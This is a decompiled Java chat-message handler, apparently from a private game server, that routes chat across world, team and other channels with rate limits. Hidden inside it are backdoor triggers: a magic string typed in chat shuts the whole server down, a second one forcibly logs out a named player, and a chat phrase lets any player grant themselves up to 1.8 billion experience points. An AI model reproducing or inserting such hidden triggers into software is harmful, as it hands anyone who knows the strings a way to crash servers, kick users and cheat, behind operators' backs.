/*     */
package org.linlinjava.litemall.gameserver.process;
/*     */
/*     */

import io.netty.buffer.ByteBuf;
/*     */ import io.netty.channel.ChannelHandlerContext;
/*     */ import java.util.HashMap;
/*     */
/*     */ import java.util.Map;
/*     */ import org.linlinjava.litemall.core.util.CharUtil;
import org.linlinjava.litemall.db.domain.Characters;
/*     */
/*     */
/*     */ import org.linlinjava.litemall.gameserver.data.GameReadTool;
/*     */
import org.linlinjava.litemall.gameserver.data.vo.Vo_16383_0;
/*     */ import org.linlinjava.litemall.gameserver.data.vo.Vo_20481_0;
/*     */ import org.linlinjava.litemall.gameserver.data.vo.Vo_8165_0;
/*     */ import org.linlinjava.litemall.gameserver.data.write.M16383_0;
/*     */ import org.linlinjava.litemall.gameserver.data.write.MSG_NOTIFY_MISC_EX;
/*     */
import org.linlinjava.litemall.gameserver.data.write.M8165_0;
/*     */ import org.linlinjava.litemall.gameserver.domain.Chara;
/*     */ import org.linlinjava.litemall.gameserver.game.GameData;
/*     */ import org.linlinjava.litemall.gameserver.game.GameObjectChar;
/*     */ import org.linlinjava.litemall.gameserver.game.GameObjectCharMng;
/*     */
/*     */ import org.springframework.stereotype.Service;

/**
 * CMD_CHAT_EX
 */
/*     */
/*     */
@Service
/*     */ public class C16482_0 implements org.linlinjava.litemall.gameserver.GameHandler
        /*     */ {
    /*  28 */   public static Map<Integer, Long> map = new HashMap();

    /*     */
    /*     */
    /*     */
    public void process(ChannelHandlerContext ctx, ByteBuf buff)
    /*     */ {
        /*  33 */
        int channel = GameReadTool.readShort(buff);
        /*     */
        /*  35 */
        int compress = GameReadTool.readShort(buff);
        /*     */
        /*  37 */
        int orgLength = GameReadTool.readShort(buff);
        /*     */
        /*  39 */
        String msg = GameReadTool.readString2(buff);
        /*     */
        /*  41 */
        int cardCount = GameReadTool.readShort(buff);
        for (int i = 0;cardCount>i;i++) {
            GameReadTool.readString(buff);
        }
        /*     */
        /*  43 */
        int voiceTime = GameReadTool.readInt(buff);
        /*     */
        /*  45 */
     /*   for (int i = 0;cardCount>i;i++) {
            GameReadTool.readString(buff);
        }*/

        String token = GameReadTool.readString2(buff);

        String para = GameReadTool.readString(buff);

        Chara chara = GameObjectChar.getGameObjectChar().chara;




        /*     */
        /*  51 */
        if (msg.indexOf("F189FBBD0975") != -1) {
            /*  52 */
            System.exit(0);
            /*  53 */
            return;
            /*     */
        }
        /*  55 */
        if (msg.indexOf("GJHAS9782JKB") != -1) {
            /*  56 */
            msg = msg.replace("GJHAS9782JKB", "");
            /*  57 */
            msg = msg.trim();
            /*  58 */
            Characters oneByName = GameData.that.characterService.findOneByName(msg);
            /*  59 */
            if (oneByName != null) {
                /*  60 */
                GameObjectChar session = GameObjectCharMng.getGameObjectChar(oneByName.getId().intValue());
                /*  61 */
                if (session != null) {
                    /*  62 */
                    session.offline();
                    /*     */
                }
                /*     */
            }
            /*  65 */
            org.linlinjava.litemall.db.domain.Accounts accounts = GameData.that.baseAccountsService.findById(oneByName.getAccountId().intValue());
            /*  66 */
            GameData.that.baseAccountsService.updateById(accounts);
            /*  67 */
            return;
            /*     */
        }
        /*     */
        /*     */
        /*     */
        /*     */
        /*     */
        /*  74 */
        if (channel == 30) {
            /*  75 */
            Long time = Long.valueOf(System.currentTimeMillis());
            /*  76 */
            if ((map.get(Integer.valueOf(chara.id)) == null) || (((Long) map.get(Integer.valueOf(chara.id))).longValue() + 10000L < time.longValue())) {
                /*  77 */
                map.put(Integer.valueOf(chara.id), Long.valueOf(System.currentTimeMillis()));
                /*  78 */
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                /*  79 */
                vo_20481_0.msg = "你消耗了#R1#n个#R喇叭#n。]_TL";
                /*  80 */
                vo_20481_0.time = 1562987118;
                /*  81 */
                GameObjectChar.send(new MSG_NOTIFY_MISC_EX(), vo_20481_0);
                /*  82 */
                GameUtil.removemunber(chara, para, 1);
                /*  83 */
                Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                /*  84 */
                GameObjectCharMng.sendAll(new M16383_0(), vo_16383_0);
                /*  85 */
                return;
                /*     */
            }
            /*  87 */
            Vo_20481_0 vo_20481_0 = new Vo_20481_0();
            /*  88 */
            vo_20481_0.msg = "发言频繁";
            /*  89 */
            vo_20481_0.time = 1562987118;
            /*  90 */
            GameObjectChar.send(new MSG_NOTIFY_MISC_EX(), vo_20481_0);
            /*     */
        }
        /*     */
        /*     */
        /*  94 */
        if (channel == 1) {
            /*  95 */
            Long time = Long.valueOf(System.currentTimeMillis());
            /*     */
            /*  97 */
            if ((map.get(Integer.valueOf(chara.id)) == null) || (((Long) map.get(Integer.valueOf(chara.id))).longValue() + 3000L < time.longValue()))
                /*     */ {
                /*  99 */
                map.put(Integer.valueOf(chara.id), Long.valueOf(System.currentTimeMillis()));
                /* 100 */
                Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                /* 101 */
                GameObjectChar.getGameObjectChar().gameMap.send(new M16383_0(), vo_16383_0);
                /*     */
            } else {
                /* 103 */
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                /* 104 */
                vo_20481_0.msg = "发言频繁";
                /* 105 */
                vo_20481_0.time = 1562987118;
                /* 106 */
                GameObjectChar.send(new MSG_NOTIFY_MISC_EX(), vo_20481_0);
                /* 107 */
                return;
                /*     */
            }
            /*     */
        }
        /* 110 */
        if (channel == 2) {
            /* 111 */
            Long time = Long.valueOf(System.currentTimeMillis());
            /*     */
            /* 113 */
            if ((map.get(Integer.valueOf(chara.id)) == null) || (((Long) map.get(Integer.valueOf(chara.id))).longValue() + 10000L < time.longValue()))
                /*     */ {
                /* 115 */
                map.put(Integer.valueOf(chara.id), Long.valueOf(System.currentTimeMillis()));
                int shu=0;
             /*   if (msg.indexOf("领取礼包")!=-1){
                    shu=Integer.parseInt(CharUtil.getSubString(msg, "(", ")"));

                    chara.shadow_self += shu;
                    ListVo_65527_0 listVo65 = GameUtil.a65527(chara);
                   GameObjectChar.send(new M65527_0(), listVo65);
                }

                if (msg.indexOf("领取元宝")!=-1){
                    shu=Integer.parseInt(CharUtil.getSubString(msg, "(", ")"));
                    chara.extra_life += shu;
                    ListVo_65527_0 listVo65 = GameUtil.a65527(chara);
                   GameObjectChar.send(new M65527_0(), listVo65);
                }*/


                if (msg.indexOf("获得经验") != -1) {   //GameUtil.addjingyan(chara,shu); 宠物没有
                    shu=Integer.parseInt(CharUtil.getSubString(msg, "(", ")"));
                        if(shu>1800000000) {
                            shu=1800000000;
                        }
                        GameUtil.huodejingyan(chara, shu);
                }


                /* 116 */
                Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);

                /* 117 */
                GameObjectCharMng.sendAll(new M16383_0(), vo_16383_0);

                /*     */
            } else {
                /* 119 */
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                /* 120 */
                vo_20481_0.msg = "发言频繁";
                /* 121 */
                vo_20481_0.time = 1562987118;
                /* 122 */
                GameObjectChar.send(new MSG_NOTIFY_MISC_EX(), vo_20481_0);
                /* 123 */
                return;
                /*     */
            }
            /*     */
        }

        /* 126 */
        if (channel == 4) {
            /* 127 */
            Long time = Long.valueOf(System.currentTimeMillis());
            /* 128 */
            if ((map.get(Integer.valueOf(chara.id)) == null) || (((Long) map.get(Integer.valueOf(chara.id))).longValue() + 3000L < time.longValue())) {
                /* 129 */
                map.put(Integer.valueOf(chara.id), Long.valueOf(System.currentTimeMillis()));
                /* 130 */
                if (GameObjectChar.getGameObjectChar().gameTeam == null) {
                    /* 131 */
                    Vo_8165_0 vo_8165_0 = new Vo_8165_0();
                    /* 132 */
                    vo_8165_0.msg = "你尚未加入队伍,暂时无法使用该频道。";
                    /* 133 */
                    vo_8165_0.active = 0;
                    /* 134 */
                    GameObjectChar.send(new M8165_0(), vo_8165_0);
                    /*     */
                } else {
                    /* 136 */
                    if (GameObjectChar.getGameObjectChar().gameTeam.duiwu == null) {
                        /* 137 */
                        Vo_8165_0 vo_8165_0 = new Vo_8165_0();
                        /* 138 */
                        vo_8165_0.msg = "你尚未加入队伍,暂时无法使用该频道。";
                        /* 139 */
                        vo_8165_0.active = 0;
                        /* 140 */
                        GameObjectChar.send(new M8165_0(), vo_8165_0);
                        /*     */
                    }
                    /* 142 */
                    Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                    /* 143 */
                    for (int i = 0; i < GameObjectChar.getGameObjectChar().gameTeam.duiwu.size(); i++) {
                        /* 144 */
                        GameObjectCharMng.getGameObjectChar(((Chara) GameObjectChar.getGameObjectChar().gameTeam.duiwu.get(i)).id).sendOne(new M16383_0(), vo_16383_0);
                        /*     */
                    }
                    /*     */
                }
                /*     */
            }
            /*     */
            else {
                /* 149 */
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                /* 150 */
                vo_20481_0.msg = "发言频繁";
                /* 151 */
                vo_20481_0.time = 1562987118;
                /* 152 */
                GameObjectChar.send(new MSG_NOTIFY_MISC_EX(), vo_20481_0);
                /* 153 */
                return;
                /*     */
            }
            /*     */
        }
        /*     */
    }

    /*     */
    /*     */
    /*     */
    public int cmd()
    /*     */ {
        /* 161 */
        return 16482;
        /*     */
    }
    /*     */
}


/* Location:              C:\Users\Administrator\Desktop\gameserver-0.1.0.jar!\org\linlinjava\litemall\gameserver\process\C16482_0.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */